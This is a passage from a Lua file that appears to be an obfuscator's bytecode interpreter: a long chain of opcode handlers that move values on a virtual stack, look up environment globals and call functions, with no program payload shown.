                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum == 107) then
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = {};
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                  else
                    Stk[Inst[2]] = Stk[Inst[3]] - Inst[4];
                  end
                elseif (Enum <= 109) then
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum > 110) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif Stk[Inst[2]] then
                  VIP = VIP + 1;
                else
                  VIP = Inst[3];
                end
              elseif (Enum <= 117) then
                if (Enum <= 114) then
                  if (Enum <= 112) then
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum == 113) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum <= 115) then
                  local NewProto = Proto[Inst[3]];
                  local NewUvals;
                  local Indexes = {};
                  NewUvals = Setmetatable({}, {__index=function(_, Key)
                    local Val = Indexes[Key];
                    return Val[1][Val[2]];
                  end,__newindex=function(_, Key, Value)
                    local Val = Indexes[Key];
                    Val[1][Val[2]] = Value;
                  end});
                  for Idx = 1, Inst[4] do
                    VIP = VIP + 1;
                    local Mvm = Instr[VIP];
                    if (Mvm[1] == 348) then
                      Indexes[Idx - 1] = {Stk,Mvm[3]};
                    else
                      Indexes[Idx - 1] = {Upvalues,Mvm[3]};
                    end
                    Lupvals[#Lupvals + 1] = Indexes;
                  end
                  Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
                elseif (Enum == 116) then
                  local B;
                  local A;
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = {};
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 120) then
                if (Enum <= 118) then
                  local A = Inst[2];
                  local B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Stk[Inst[4]]];
                elseif (Enum > 119) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 122) then
                if (Enum > 121) then
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Stk[Inst[2]] <= Stk[Inst[4]]) then
                  VIP = VIP + 1;
                else
                  VIP = Inst[3];
                end
              elseif (Enum > 123) then
                Stk[Inst[2]] = Upvalues[Inst[3]];
              else
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = {};
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = {};
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum <= 136) then
              if (Enum <= 130) then
                if (Enum <= 127) then
                  if (Enum <= 125) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum > 126) then
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  else
                    local B;
                    local A;
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Stk[Inst[4]]];
                  end
                elseif (Enum <= 128) then
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum == 129) then
                  local A;
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 133) then
                if (Enum <= 131) then
                  local K;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  B = Inst[3];
                  K = Stk[B];
                  for Idx = B + 1, Inst[4] do
                    K = K .. Stk[Idx];
                  end
                  Stk[Inst[2]] = K;
                elseif (Enum > 132) then
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                else
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 134) then
                local A;
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
